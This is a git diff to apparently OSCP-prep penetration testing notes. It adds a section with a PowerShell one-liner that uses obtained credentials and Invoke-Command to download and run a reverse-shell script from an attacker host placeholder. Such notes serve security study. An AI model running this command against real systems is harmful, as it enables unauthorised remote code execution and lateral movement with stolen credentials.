@@ -7,7 +7,7 @@ They have also been written as part of my preparation for OSCP.
 
 By all of the above I mean that these Notes are not for malignant or malicious purposes, and cannot be used to carry out malicious/illegal actions.
 
-I will not be responsible in any way for the use people may make of the concepts and commands explained in the following sections.
+**I will not be responsible** in any way for the use people may make of the concepts and commands explained in the following sections.
 
 
 Table of Contents
@@ -24,6 +24,7 @@ Table of Contents
    * [PowerShell](#powershell)
       * [To load a PS module into the memory](#to-load-a-ps-module-into-the-memory)
       * [Changing <em>ExecutionPolicy</em> to Bypass](#changing-executionpolicy-to-bypass)
+      * [Executing commands as another user](#executing-commands-as-another-user)
    * [PrivEsc on Windows](#privesc-on-windows)
       * [Bypassing Windows Defender](#bypassing-windows-defender)
       * [Sharing files with Windows machine](#sharing-files-with-windows-machine)
@@ -113,6 +114,14 @@ The following command in PowerShell, if we have enough permissions, will change 
 
 ```powershell
 Set-ExecutionPolicy Bypass -Scope Process
+```
+
+## Executing commands as another user
+Have we obtained a shell from your objective and got any credentials we can use to impersonate any user, the following commands will give us a shell with the other user permissions:
+```powershell
+$password = ConvertTo-SecureString '__PasswordObtained__' -Asplain -Force
+$credential = New-Object System.Management.Automation.PSCredential('__Domain__\__User__', $password)
+Invoke-Command -Computer __Hostname__ -Credential $credential -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://__LHOST__/rev.ps1') }
 ```
 
 # PrivEsc on Windows
